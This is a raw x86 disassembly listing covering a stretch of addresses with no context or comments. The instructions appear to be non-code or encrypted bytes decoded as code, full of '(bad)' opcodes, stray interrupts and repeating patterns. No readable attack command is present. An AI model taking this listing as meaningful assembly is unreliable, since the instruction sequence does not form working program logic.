  4271f8:	jbe    0x42720e
  4271fa:	int    0x8d
  4271fc:	adc    al,0xcd
  4271fe:	mov    ebp,ecx
  427200:	cmp    BYTE PTR [ebx],0xf0
  427203:	shl    edx,cl
  427205:	sub    BYTE PTR [ebx],bh
  427207:	jns    0x4271dc
  427209:	mov    ebp,0xcad35392
  42720e:	je     0x427195
  427210:	ror    ch,1
  427212:	lea    edx,[ecx]
  427214:	int    0x89
  427216:	int    0x96
  427218:	adc    ebp,ecx
  42721a:	and    bh,BYTE PTR [ebx]
  42721c:	psrlq  mm5,mm3
  42721f:	xchg   edx,eax
  427220:	cmp    ebx,ecx
  427222:	shr    edx,cl
  427224:	sub    BYTE PTR [ebx+0x13],dl
  427227:	retf   0x4d8c
  42722a:	rol    BYTE PTR [edx-0x2d],1
  42722d:	int    0x8d
  42722f:	in     eax,dx
  427230:	int    0x89
  427232:	int    0x96
  427234:	in     eax,dx
  427235:	int    0x22
  427237:	cmp    ecx,DWORD PTR [edi]
  427239:	shr    ebx,cl
  42723b:	xchg   edx,eax
  42723c:	cmp    ebx,ecx
  42723e:	shr    edx,cl
  427240:	sub    BYTE PTR [ebx+0x13],dl
  427243:	retf   0x4d8c
  427246:	ror    BYTE PTR [edx-0x2d],1
  427249:	int    0x8d
  42724b:	adc    ebp,ecx
  42724d:	mov    ebp,ecx
  42724f:	xchg   esi,eax
  427250:	adc    ebp,ecx
  427252:	and    bh,BYTE PTR [ebx]
  427254:	(bad)  
  427256:	(bad)  
  427258:	jmp    0x4271ec
  42725a:	shr    edx,cl
  42725c:	sub    BYTE PTR [ebx+0x13],dl
  42725f:	retf   0x4d8c
  427262:	push   ebp
  427263:	pusha  
  427264:	jge    0x427295
  427266:	push   es
  427267:	cmc    
  427268:	add    BYTE PTR [eax-0x12893280],0xcd
  42726f:	(bad)  
  427270:	in     eax,dx
  427271:	int    0x89
  427273:	int    0x80
  427275:	cmp    esi,eax
  427277:	shl    edx,cl
  427279:	sub    BYTE PTR [ebx],bh
  42727b:	jns    0x427250
  42727d:	mov    ebp,0xcad35392
  427282:	je     0x427209
  427284:	ror    ch,1
  427286:	lea    edx,[ecx*8+0x1496cd89]
  42728d:	int    0x22
  42728f:	cmp    ecx,DWORD PTR [edi]
  427291:	shr    ebx,cl
  427293:	xchg   edx,eax
  427294:	cmp    ebx,ecx
  427296:	shr    edx,cl
  427298:	sub    BYTE PTR [ebx+0x13],dl
  42729b:	retf   0x4d8c
  42729e:	rol    BYTE PTR [edx-0x2d],1
  4272a1:	int    0x8d
  4272a3:	cmc    
  4272a4:	int    0x89
  4272a6:	int    0x96
  4272a8:	cmc    
  4272a9:	int    0x22
  4272ab:	cmp    ecx,DWORD PTR [edi]
  4272ad:	shr    ebx,cl
  4272af:	xchg   edx,eax
  4272b0:	cmp    ebx,ecx
  4272b2:	shr    edx,cl
  4272b4:	sub    BYTE PTR [ebx+0x13],dl
  4272b7:	retf   0x4d8c
  4272ba:	ror    BYTE PTR [edx-0x2d],1
  4272bd:	int    0x8d
  4272bf:	adc    al,0xcd
  4272c1:	mov    ebp,ecx
  4272c3:	xchg   esi,eax
  4272c4:	adc    al,0xcd
  4272c6:	and    bh,BYTE PTR [ebx]
  4272c8:	(bad)  
  4272ca:	(bad)  
  4272cc:	jmp    0x427260
  4272ce:	shr    edx,cl
  4272d0:	sub    BYTE PTR [ebx+0x13],dl
  4272d3:	retf   0x4d8c
  4272d6:	push   ebp
  4272d7:	pusha  
  4272d8:	jge    0x427309
  4272da:	push   es
  4272db:	add    DWORD PTR [eax+0x76cd8080],eax
  4272e1:	in     eax,dx
  4272e2:	int    0x8d
  4272e4:	in     eax,dx
  4272e5:	int    0x89
  4272e7:	int    0x80
  4272e9:	cmp    esi,eax
  4272eb:	shl    edx,cl
  4272ed:	sub    BYTE PTR [ebx],bh
  4272ef:	jns    0x4272c4
  4272f1:	mov    ebp,0xcad35392
  4272f6:	je     0x42727d
  4272f8:	ror    ch,1
  4272fa:	(bad)  
  4272fb:	cmc    
  4272fc:	int    0x89
  4272fe:	int    0x96
  427300:	cmc    
  427301:	int    0x22
  427303:	cmp    ecx,DWORD PTR [edi]
  427305:	shr    ebx,cl
  427307:	xchg   edx,eax
  427308:	cmp    ebx,ecx
  42730a:	shr    edx,cl
  42730c:	sub    BYTE PTR [ebx+0x13],dl
  42730f:	retf   0x4d8c
  427312:	rol    BYTE PTR [edx-0x2d],1
  427315:	int    0x8d
  427317:	adc    ebp,ecx
  427319:	mov    ebp,ecx
  42731b:	xchg   esi,eax
  42731c:	adc    ebp,ecx
  42731e:	and    bh,BYTE PTR [ebx]
  427320:	psrlq  mm5,mm3
  427323:	xchg   edx,eax
  427324:	cmp    ebx,ecx
  427326:	shr    edx,cl
  427328:	sub    BYTE PTR [ebx+0x13],dl
  42732b:	retf   0x4d8c
  42732e:	ror    BYTE PTR [edx-0x2d],1
  427331:	int    0x8d
  427333:	in     eax,dx
  427334:	int    0x89
  427336:	int    0x96
  427338:	in     eax,dx
  427339:	int    0x22
  42733b:	cmp    ecx,DWORD PTR [edi]
  42733d:	cmp    ebx,ecx
  42733f:	shr    ebx,cl
  427341:	xchg   edx,eax
  427342:	shr    edx,cl
  427344:	sub    BYTE PTR [ebx+0x13],dl
  427347:	retf   0x4d8c
  42734a:	push   ebp
  42734b:	pusha  
  42734c:	jge    0x427324
  42734e:	xor    bh,cl
  427350:	jbe    0x427322
  427352:	jo     0x427311
  427354:	outs   dx,DWORD PTR ds:[esi]
  427355:	lods   eax,DWORD PTR ds:[esi]
  427356:	add    BYTE PTR [eax],al
  427358:	int    0x8d
  42735a:	pop    ebp
  42735b:	inc    ebx
  42735c:	rcl    esp,cl
  42735e:	push   ss
  42735f:	int    0x76
  427361:	std    
  427362:	int    0x8d
  427364:	std    
  427365:	cmp    esi,eax
  427367:	cmp    edi,DWORD PTR [ecx-0x2d]
  42736a:	repnz sub bl,dl
  42736d:	mov    ebp,0xad35392
  427372:	jbe    0x427321
  427374:	int    0x76
  427376:	stc    
  427377:	int    0xa6
  427379:	stc    
  42737a:	int    0x76
  42737c:	stc    
  42737d:	int    0x8d
  42737f:	stc    
  427380:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  427386:	xchg   edx,eax
  427387:	shr    DWORD PTR [ebp-0x7862acd8],cl
  42738d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42738e:	gs int 0x76
  427391:	xchg   ebp,eax
  427392:	cmp    ecx,DWORD PTR [edi]
  427394:	add    al,0xf2
  427396:	std    
  427397:	add    al,0xad
  427399:	std    
  42739a:	shr    esp,cl
  42739c:	sub    BYTE PTR [edi+0x12db537d],al
  4273a2:	hlt    
  4273a3:	dec    ecx
  4273a4:	and    DWORD PTR [esi-0x28932cb],eax
  4273aa:	int    0x8d
  4273ac:	std    
  4273ad:	cmp    esi,eax
  4273af:	cmp    edi,DWORD PTR [ecx-0x2d]
  4273b2:	repnz sub bl,dl
  4273b5:	mov    ebp,0xcdd35392
  4273ba:	lea    ebp,[ebp+0x52f7d43]
  4273c0:	push   ds
  4273c1:	std    
  4273c2:	add    BYTE PTR [eax],al
  4273c4:	int    0x76
  4273c6:	std    
  4273c7:	int    0x8d
  4273c9:	std    
  4273ca:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273cd:	lock shl edx,cl
  4273d0:	sub    bl,dl
  4273d2:	mov    ebp,0xcdd35392
  4273d7:	lea    ebp,[ebp+0x1ad67d43]
  4273dd:	int    0x76
  4273df:	stc    
  4273e0:	int    0x8d
  4273e2:	stc    
  4273e3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273e6:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4273ed:	push   ebx
  4273ee:	shr    ebx,cl
  4273f0:	jle    0x427373
  4273f2:	add    BYTE PTR [eax+0x5b6324c0],0x0
  4273f9:	(bad)  
  4273fa:	popf   
  4273fb:	iret   
  4273fc:	jbe    0x427413
  4273fe:	jo     0x4273bd
  427400:	jge    0x4273dd
  427402:	add    BYTE PTR [eax],al
  427404:	int    0x76
  427406:	std    
  427407:	int    0x8d
  427409:	std    
  42740a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42740d:	lock shl edx,cl
  427410:	sub    bl,dl
  427412:	mov    ebp,0xcdd35392
  427417:	lea    esp,[ebp+0x5bd4d343]
  42741d:	int    0x76
  42741f:	stc    
  427420:	int    0x8d
  427422:	stc    
  427423:	cmp    edi,DWORD PTR [ecx+0x3b]
  427426:	lock shl edx,cl
  427429:	sub    bl,dl
  42742b:	mov    ebp,0xcdd35392
  427430:	lea    esp,[ebp+0x26d4d343]
  427436:	int    0x76
  427438:	stc    
  427439:	int    0x8d
  42743b:	stc    
  42743c:	cmp    edi,DWORD PTR [ecx+0x3b]
  42743f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427446:	push   ebx
  427447:	shl    DWORD PTR [eax+0x5b],cl
  42744a:	iret   
  42744b:	jbe    0x427462
  42744d:	jo     0x42740c
  42744f:	das    
  427450:	cli    
  427451:	add    BYTE PTR [eax],al
  427453:	int    0x76
  427455:	std    
  427456:	int    0x8d
  427458:	std    
  427459:	cmp    edi,DWORD PTR [ecx+0x3b]
  42745c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427463:	push   ebx
  427464:	shl    DWORD PTR [eax+0x5b],cl
  427467:	iret   
  427468:	jbe    0x42747f
  42746a:	jo     0x427429
  42746c:	sti    
  42746d:	stc    
  42746e:	add    BYTE PTR [eax],al
  427470:	int    0x76
  427472:	popf   
  427473:	xchg   ebp,eax
  427475:	or     dh,BYTE PTR [esi+0x14]
  427478:	add    dh,dl
  42747a:	cmp    eax,0xcd14d600
  42747f:	jbe    0x4274b6
  427481:	xchg   DWORD PTR [esi-0x78],esi
  427484:	jo     0x427443
  427486:	push   edx
  427487:	fild   DWORD PTR [eax]
  427489:	add    ch,cl
  42748b:	jbe    0x42748a
  42748d:	int    0x8d
  42748f:	std    
  427490:	cmp    edi,DWORD PTR [ecx+0x3b]
  427493:	lock shl edx,cl
  427496:	sub    bl,dl
  427498:	mov    ebp,0xcdd35392
  42749d:	lea    esp,[ebp-0x592b2cbd]
  4274a3:	int    0x76
  4274a5:	stc    
  4274a6:	int    0x8d
  4274a8:	stc    
  4274a9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274ac:	lock shl edx,cl
  4274af:	sub    bl,dl
  4274b1:	mov    ebp,0xcdd35392
  4274b6:	lea    esp,[ebp+0x32d4d343]
  4274bc:	int    0x76
  4274be:	stc    
  4274bf:	int    0x8d
  4274c1:	stc    
  4274c2:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274c5:	mov    ebp,0xd3f03b92
  4274ca:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274ce:	jo     0x4274d0
  4274d0:	(bad)  
  4274d1:	cmp    eax,0x873576cd
  4274d6:	jbe    0x427460
  4274d8:	jo     0x427497
  4274da:	add    eax,0xcd0000f9
  4274df:	jbe    0x4274de
  4274e1:	int    0x8d
  4274e3:	std    
  4274e4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274e7:	mov    ebp,0xd3f03b92
  4274ec:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274f0:	jo     0x4274f2
  4274f2:	(bad)  
  4274f3:	cmp    eax,0x873576cd
  4274f8:	jbe    0x427482
  4274fa:	jo     0x4274b9
  4274fc:	jb     0x4274f7
  4274fe:	add    BYTE PTR [eax],al
  427500:	int    0x8d
  427502:	inc    ebp
  427503:	int    0x76
  427505:	inc    ebp
  427506:	cmp    ecx,ecx
  427508:	cmp    ecx,DWORD PTR [edi]
  42750a:	shr    ebx,cl
  42750c:	xchg   edx,eax
  42750d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  427513:	lea    ebp,ds:0x803fd33b
  427519:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427523:	jo     0x427525
  427525:	(bad)  
  427526:	cmp    eax,0x87358dcd
  42752b:	lea    ecx,[eax+0xa95abd]
  427531:	add    ch,cl
  427533:	jbe    0x427565
  427535:	int    0x8d
  427537:	cmp    eax,0x76cd8881
  42753c:	cmp    eax,0xabd7687
  427541:	jbe    0x427500
  427543:	int    0x76
  427545:	stc    
  427546:	int    0x8d
  427548:	stc    
  427549:	cmp    esi,eax
  42754b:	shl    edx,cl
  42754d:	sub    BYTE PTR [ebx],bh
  42754f:	jns    0x427524
  427551:	mov    ebp,0xcdd35392
  427556:	lea    edi,[ebp-0x322c2ed1]
  42755c:	(bad)  
  42755d:	std    
  42755e:	int    0x96
  427560:	std    
  427561:	cmp    ecx,DWORD PTR [edi]
  427563:	cmp    ebx,ecx
  427565:	shr    ebx,cl
  427567:	xchg   edx,eax
  427568:	shr    edx,cl
  42756a:	sub    BYTE PTR [ebx+0x13],dl
  42756d:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  427573:	or     edi,DWORD PTR [ecx]
  427575:	cli    
  427576:	add    BYTE PTR [eax],al
  427578:	int    0x76
  42757a:	mov    BYTE PTR [edx-0x2d349c58],ch
  427580:	xor    BYTE PTR [eax+0x4edcd96],al
  427586:	in     eax,dx
  427587:	adc    al,0x5b
  427589:	cwde   
  42758a:	call   0xcd34:0x76cd6d3b
  427591:	add    DWORD PTR ds:0xcd808081,ebp
  427597:	xchg   esi,eax
  427598:	mov    ch,cl
  42759a:	or     ch,0xd6
  42759d:	dec    esp
  42759e:	int    0xe6
  4275a0:	mov    ch,cl
  4275a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275a3:	dec    esp
  4275a4:	or     dh,BYTE PTR [esi-0x3]
  4275a7:	pop    edi
  4275a8:	jnp    0x4275e1
  4275aa:	ficom  WORD PTR [ebx]
  4275ac:	cmp    esp,ebx
  4275ae:	pop    ebp
  4275af:	mov    ebp,0x3b25230a
  4275b4:	adc    DWORD PTR [edi],ebp
  4275b6:	inc    ebp
  4275b7:	sti    
  4275b8:	xchg   edx,eax
  4275b9:	shr    ecx,cl
  4275bb:	sub    BYTE PTR [edx],dl
  4275bd:	clc    
  4275be:	add    BYTE PTR [eax-0x102c9380],0x92
  4275c5:	cmp    ebx,ebp
  4275c7:	push   ebx
  4275c8:	clc    
  4275c9:	int    0xe6
  4275cb:	sbb    al,0x53
  4275cd:	aad    0x43
  4275cf:	(bad)  
  4275d1:	sbb    eax,DWORD PTR [ebx-0xc]
  4275d4:	(bad)  
  4275d5:	das    
  4275d6:	adc    cl,BYTE PTR [ebp+0x59]
  4275d9:	je     0x427585
  4275db:	push   edi
  4275dc:	ja     0x4275a3
  4275de:	xchg   edi,eax
  4275df:	shr    ebx,0xd9
  4275e2:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  4275ec:	xchg   esi,eax
  4275ed:	mov    ch,cl
  4275ef:	(bad)  
  4275f0:	dec    esp
  4275f1:	int    0x96
  4275f3:	mov    ch,cl
  4275f5:	(bad)  
  4275f6:	dec    esp
  4275f7:	int    0xe6
  4275f9:	mov    ch,cl
  4275fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275fc:	dec    esp
  4275fd:	cmp    edx,DWORD PTR [ecx]
  4275ff:	cmp    esp,ebx
  427601:	das    
  427602:	inc    ebp
  427603:	sti    
  427604:	xchg   edx,eax
  427605:	shr    ecx,cl
  427607:	sub    BYTE PTR [edx],dl
  427609:	clc    
  42760a:	add    BYTE PTR [eax-0x22c49380],0x53
  427611:	aad    0xd3
  427613:	out    dx,eax
  427614:	xchg   edx,eax
  427615:	push   ebx
  427616:	clc    
  427617:	int    0xe6
  427619:	xor    ch,cl
  42761b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42761c:	adc    al,0x3b
  42761e:	popf   
  42761f:	int    0x76
  427621:	xor    BYTE PTR [ebx],bh
  427623:	cli    
  427624:	int    0x8d
  427626:	adc    al,0x2f
  427628:	inc    ebp
  427629:	loope  0x4275bd
  42762b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  427631:	cli    
  427632:	push   esi
  427633:	add    BYTE PTR [eax-0x132c9380],0x92
  42763a:	push   ebx
  42763b:	popf   
  42763c:	int    0x76
  42763e:	mov    BYTE PTR [edi-0x320be427],al
  427644:	bswap  ebp
  427646:	(bad)  
  427647:	dec    esp
  427648:	int    0xe6
  42764a:	xor    ch,cl
  42764c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42764d:	adc    al,0x4
  42764f:	lods   eax,DWORD PTR ds:[esi]
  427650:	std    
  427651:	add    al,0xe9
  427653:	std    
  427654:	shr    ebx,cl
  427656:	sub    BYTE PTR [ebx],bh
  427658:	ficom  DWORD PTR [esi-0x2c]
  42765b:	aaa    
  42765c:	ficom  WORD PTR [ebx]
  42765e:	adc    dh,bh
  427660:	mov    ebp,0x1225230a
  427665:	clc    
  427666:	aam    0x37
  427668:	ficom  WORD PTR [ebx]
  42766a:	adc    dh,ah
  42766c:	mov    ebp,0x8725230a
  427671:	leave  
  427672:	sbb    esi,esp
  427674:	push   ebx
  427675:	jge    0x4276ca
  427677:	cdq    
  427678:	pop    ebp
  427679:	mov    ebp,0x1225230a
  42767e:	add    dl,dh
  427680:	aaa    
  427681:	ficom  WORD PTR [ebx]
  427683:	cmp    esi,ecx
  427685:	adc    bh,dl
  427687:	out    0x37,al
  427689:	ficom  WORD PTR [ebx]
  42768b:	(bad)  
  42768c:	sbb    eax,DWORD PTR [ebx-0xf]
  42768f:	(bad)  
  427690:	das    
  427691:	adc    dl,BYTE PTR [esi-0x1]
  427694:	das    
  427695:	stos   DWORD PTR es:[edi],eax
  427696:	push   es
  427697:	in     eax,0x9b
  427699:	xchg   edi,eax
  42769a:	imul   bl
  42769c:	and    al,0x81
  42769e:	add    BYTE PTR [eax-0x32776933],0xd6
  4276a5:	dec    esp
  4276a6:	int    0xa6
  4276a8:	mov    ch,cl
  4276aa:	out    0x4c,al
  4276ac:	cmp    edx,DWORD PTR [ecx]
  4276ae:	pop    edi
  4276af:	jnp    0x4276e8
  4276b1:	ficom  WORD PTR [ebx]
  4276b3:	cmp    esp,ebx
  4276b5:	das    
  4276b6:	inc    ebp
  4276b7:	sti    
  4276b8:	xchg   edx,eax
  4276b9:	shr    edi,cl
  4276bb:	xchg   edx,eax
  4276bc:	cmp    eax,DWORD PTR [eax]
  4276be:	shl    ebp,cl
  4276c0:	sub    BYTE PTR [edx],cl
  4276c2:	(bad)  
  4276c3:	cmc    
  4276c4:	push   ebx
  4276c5:	fxch   st(5)
  4276c7:	out    0xf5,al
  4276c9:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  4276d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276d4:	and    al,0xcd
  4276d6:	and    ecx,DWORD PTR [edx]
  4276d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276d9:	adc    DWORD PTR [ebx-0x1e],eax
  4276dc:	(bad)  
  4276dd:	xchg   BYTE PTR [ebx],bh
  4276df:	fiadd  DWORD PTR [ebx-0x27]
  4276e2:	aam    0x20
  4276e4:	add    dh,dl
  4276e6:	xor    al,0xcd
  4276e8:	(bad)  
  4276e9:	and    al,0x0
  4276eb:	(bad)  
  4276ec:	sub    al,0x0
  4276ee:	(bad)  
  4276ef:	std    
  4276f0:	add    BYTE PTR [eax-0x43],bl
  4276f3:	sub    edi,eax
  4276f5:	add    BYTE PTR [eax],al
  4276f7:	or     al,BYTE PTR [esi-0x7f7f9615]
  4276fd:	or     ch,0x96
  427700:	mov    ch,cl
  427702:	out    0x4c,al
  427704:	cmp    edi,ecx
  427706:	cmp    esp,ebx
  427708:	das    
  427709:	inc    ebp
  42770a:	add    edx,DWORD PTR [edx+0xa9210d3]
  427710:	out    0xf5,al
  427712:	int    0xe6
  427714:	mov    ch,cl
  427716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427717:	dec    esp
  427718:	shr    ecx,cl
  42771a:	sub    BYTE PTR [ebx],bh
  42771c:	dec    ebp
  42771e:	(bad)  
  42771f:	cmc    
  427720:	cmp    ebx,ebp
  427722:	push   ebx
  427723:	clc    
  427724:	int    0xe6
  427726:	xor    BYTE PTR [ebx],bh
  427728:	cli    
  427729:	push   ebx
  42772a:	aad    0xcd
  42772c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42772d:	adc    al,0x3b
  42772f:	popf   
  427730:	int    0xc9
  427732:	int    0xe6
  427734:	xor    ch,cl
  427736:	or     al,0xcd
  427738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427739:	adc    al,0x2f
  42773b:	inc    ebp
  42773c:	jge    0x4276d0
  42773e:	shr    ecx,cl
  427740:	sub    BYTE PTR [ebx],bh
  427742:	fst    st(3)
  427744:	jmp    0x4276d8
  427746:	adc    bh,al
  427748:	add    BYTE PTR [eax-0x3aac9380],0x53
  42774f:	lock inc ebx
  427751:	icebp  
  427752:	(bad)  
  427753:	sbb    BYTE PTR [ebx+0x2],al
  427756:	(bad)  
  427757:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  42775d:	mov    esi,0xdd8bf56d
  427762:	(bad)  
  427763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427764:	cmp    edi,esp
  427766:	sbb    eax,0xcd62ec76
  42776b:	jbe    0x4276f5
  42776d:	int    0x8d
  42776f:	dec    esp
  427770:	int    0x96
  427772:	mov    ch,cl
  427774:	(bad)  
  427775:	dec    esp
  427776:	adc    al,BYTE PTR [edx]
  427778:	mov    ebp,0x5625230a
  42777d:	jnp    0x4277b6
  42777f:	ficom  WORD PTR [ebx]
  427781:	das    
  427782:	inc    ebp
  427783:	jge    0x427717
  427785:	int    0xfb
  427787:	cmp    eax,DWORD PTR [eax]
  427789:	cmp    ebx,edx
  42778b:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  427791:	jmp    0x427725
  427793:	adc    dh,bh
  427795:	add    BYTE PTR [eax-0x36ac9380],0x53
  42779c:	divps  xmm6,XMMWORD PTR [esi-0x3]
  4277a0:	(bad)  
  4277a1:	test   BYTE PTR [ebx-0x1d],al
  4277a4:	aam    0x4c
  4277a6:	adc    al,BYTE PTR [esi-0x3e]
  4277a9:	gs sub al,0x1
  4277ac:	jo     0x4277e8
  4277ae:	mov    edx,0x124aece0
  4277b3:	ss inc edx
  4277b5:	das    
  4277b6:	sbb    edx,esi
  4277b8:	mov    ebx,0xaa029f75
  4277bd:	test   al,0x63
  4277bf:	retf   
  4277c0:	shr    BYTE PTR [eax+eax*4],cl
  4277c3:	xchg   esi,eax
  4277c4:	int    0xed
  4277c6:	add    al,0xed
  4277c8:	dec    esp
  4277c9:	int    0x76
  4277cb:	mov    ch,cl
  4277cd:	lea    ecx,[edi+ebp*1+0x45]
  4277d1:	jge    0x427765
  4277d3:	shr    ebx,cl
  4277d5:	xchg   edx,eax
  4277d6:	int    0x8d
  4277d8:	mov    ch,cl
  4277da:	xchg   esi,eax
  4277db:	dec    esp
  4277dc:	cwde   
  4277dd:	shl    edx,cl
  4277df:	sub    ch,cl
  4277e1:	lea    ebx,[ecx+ebp*2]
  4277e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277e5:	mov    esi,0x793b4229
  4277ea:	cmp    ebx,edx
  4277ec:	push   ebx
  4277ed:	ror    BYTE PTR [edx],cl
  4277ef:	or     ebp,0x1cd2476
  4277f5:	xor    eax,0xcd808081
  4277fa:	mov    ch,cl
  4277fc:	jbe    0x427822
  4277fe:	int    0x1
  427800:	xor    eax,0xcd808081
  427805:	add    BYTE PTR [edi-0x72329b92],0x24
  42780c:	int    0xa
  42780e:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  427814:	adc    al,0xc0
  427816:	test   BYTE PTR [eax+eax*4+0x808050],bh
  42781d:	nop
  42781e:	jo     0x427882
  427820:	add    bl,ah
  427822:	or     cl,BYTE PTR [ebx-0x32778933]
  427828:	lea    ecx,[edi+ebp*1+0x45]
  42782c:	jge    0x4277c0
  42782e:	shr    ebx,cl
  427830:	xchg   edx,eax
  427831:	int    0x8d
  427833:	mov    ch,cl
  427835:	xchg   esi,eax
  427836:	dec    esp
  427837:	add    dh,dl
  427839:	and    al,0x3b
  42783b:	jns    0x427878
  42783d:	ficom  DWORD PTR [ebx-0x2e]
  427840:	or     dh,BYTE PTR [esi-0x3]
  427843:	iret   
  427844:	jbe    0x427843
  427846:	jo     0x4277e2
  427848:	add    dh,dl
  42784a:	sbb    al,0xd3
  42784c:	repnz sub BYTE PTR [eax],al
  42784f:	(bad)  
  427850:	adc    al,0x0
  427852:	(bad)  
  427853:	xor    BYTE PTR [eax],al
  427855:	(bad)  
  427856:	dec    esp
  427857:	add    dh,dl
  427859:	mov    BYTE PTR [ebp+0xfe2b],bh
  42785f:	int    0x76
  427861:	mov    ch,cl
  427863:	lea    ecx,[edi+ebp*1+0x45]
  427867:	jge    0x4277fb
  427869:	shr    ebx,cl
  42786b:	xchg   edx,eax
  42786c:	int    0x8d
  42786e:	mov    ch,cl
  427870:	xchg   esi,eax
  427871:	dec    esp
  427872:	cmp    edi,DWORD PTR [ecx+0x3b]
  427875:	fcmovbe st,st(3)
  427877:	repnz sub ch,cl
  42787a:	das    
  42787b:	push   ebx
  42787c:	rol    BYTE PTR [ebx+0x7d],cl
  42787f:	aam    0x36
  427881:	int    0x76
  427883:	xor    ch,cl
  427885:	lea    edx,[edi+ebp*1]
  427888:	inc    ebp
  427889:	jge    0x42781d
  42788b:	shr    ebx,cl
  42788d:	xchg   edx,eax
  42788e:	int    0x8d
  427890:	xor    ch,cl
  427892:	xchg   esi,eax
  427893:	adc    al,0x3b
  427895:	jns    0x4278d2
  427897:	fcmovbe st,st(3)
  427899:	repnz sub ch,cl
  42789c:	lea    ebx,[ebx+edx*2]
  42789f:	shr    BYTE PTR [edi],cl
  4278a1:	shl    DWORD PTR [esi-0x3],1
  4278a4:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  4278aa:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  4278b1:	call   0xcd3c:0xd6cd6d3b
  4278b8:	xchg   esi,eax
  4278b9:	inc    esp
  4278ba:	int    0xe6
  4278bc:	and    al,0x5d
  4278be:	mov    ebp,0x5f25230a
  4278c3:	jnp    0x4278fc
  4278c5:	ficom  WORD PTR [ebx]
  4278c7:	inc    ebx
  4278c8:	icebp  
  4278c9:	das    
  4278ca:	or     BYTE PTR [edi],al
  4278cc:	add    BYTE PTR [eax-0x4613080],0x82
  4278d3:	test   BYTE PTR [ebx-0xc],al
  4278d6:	jnp    0x4278be
  4278d8:	inc    ebx
  4278d9:	hlt    
  4278da:	(bad)  
  4278db:	mov    BYTE PTR [ebx-0xf],al
  4278de:	das    
  4278df:	add    eax,0x80809216
  4278e4:	adc    bh,bh
  4278e6:	jno    0x42791f
  4278e8:	ficom  WORD PTR [ebx]
  4278ea:	(bad)  
  4278eb:	mov    BYTE PTR [ebx-0xf],al
  4278ee:	das    
  4278ef:	add    eax,0x80809285
  4278f4:	adc    bh,bh
  4278f6:	xchg   esi,eax
  4278f7:	aaa    
  4278f8:	ficom  WORD PTR [ebx]
  4278fa:	(bad)  
  4278fb:	mov    BYTE PTR [ebx-0xf],al
  4278fe:	das    
  4278ff:	add    eax,0x808080f8
  427904:	adc    bh,bh
  427906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427907:	aaa    
  427908:	ficom  WORD PTR [ebx]
  42790a:	(bad)  
  42790b:	test   BYTE PTR [ebx-0xf],al
  42790e:	aam    0x3e
  427910:	adc    bh,bh
  427912:	scas   al,BYTE PTR es:[edi]
  427913:	aaa    
  427914:	ficom  WORD PTR [ebx]
  427916:	(bad)  
  427917:	mov    BYTE PTR [ebx-0xf],al
  42791a:	das    
  42791b:	add    eax,0x808081db
  427920:	adc    bh,bh
  427922:	mov    dh,0x37
  427924:	ficom  WORD PTR [ebx]
  427926:	das    
  427927:	push   es
  427928:	into   
  427929:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  427933:	sub    bl,0x12
  427936:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  427940:	(bad)  
  427941:	adc    al,0x0
  427943:	(bad)  
  427944:	xor    BYTE PTR [eax],al
  427946:	(bad)  
  427947:	dec    esp
  427948:	add    dh,dl
  42794a:	mov    BYTE PTR [ebp+0xff77],bh
  427950:	jmp    0x427908
  427952:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  42795c:	mov    BYTE PTR [ebx-0xf],al
  42795f:	das    
  427960:	add    eax,0x80808019
  427965:	adc    bh,bh
  427967:	xchg   ecx,eax
  427968:	aaa    
  427969:	ficom  WORD PTR [ebx]
  42796b:	(bad)  
  42796c:	mov    BYTE PTR [ebx-0xf],al
  42796f:	das    
  427970:	add    eax,0x8080818e
  427975:	adc    bh,bh
  427977:	(bad)  
  427978:	aaa    
  427979:	ficom  WORD PTR [ebx]
  42797b:	(bad)  
  42797c:	test   BYTE PTR [ebx-0xf],al
  42797f:	aam    0x1c
  427981:	adc    bh,bh
  427983:	fidiv  WORD PTR [edi]
  427985:	ficom  WORD PTR [ebx]
  427987:	(bad)  
  427988:	mov    BYTE PTR [ebx-0xf],al
  42798b:	das    
  42798c:	add    eax,0x80808142
  427991:	adc    bh,bh
  427993:	out    0x37,al
  427995:	ficom  WORD PTR [ebx]
  427997:	in     al,dx
  427998:	iret   
  427999:	int    0x96
  42799b:	mov    ch,cl
  42799d:	(bad)  
  42799e:	dec    esp
  42799f:	int    0xe6
  4279a1:	mov    ch,cl
  4279a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279a4:	dec    esp
